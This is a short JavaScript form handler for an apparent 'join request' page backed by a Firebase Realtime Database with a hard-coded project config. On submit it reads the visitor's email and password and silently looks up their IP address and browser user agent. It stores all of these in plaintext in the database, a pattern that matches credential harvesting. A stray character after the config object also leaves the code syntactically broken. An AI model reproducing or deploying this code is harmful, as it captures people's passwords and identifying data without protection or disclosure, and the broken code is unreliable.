import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDZ3DPSIUMK72TLyvq3u4ituvaX5HhdGKs",
  authDomain: "azizulvai-42aa0.firebaseapp.com",
  databaseURL: "https://azizulvai-42aa0-default-rtdb.firebaseio.com",
  projectId: "azizulvai-42aa0",
  storageBucket: "azizulvai-42aa0.firebasestorage.app",
  messagingSenderId: "548358971486",
  appId: "1:548358971486:web:e0c9548edf01bec64f54cf",
  measurementId: "G-NWNME8GX6G"
};s

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
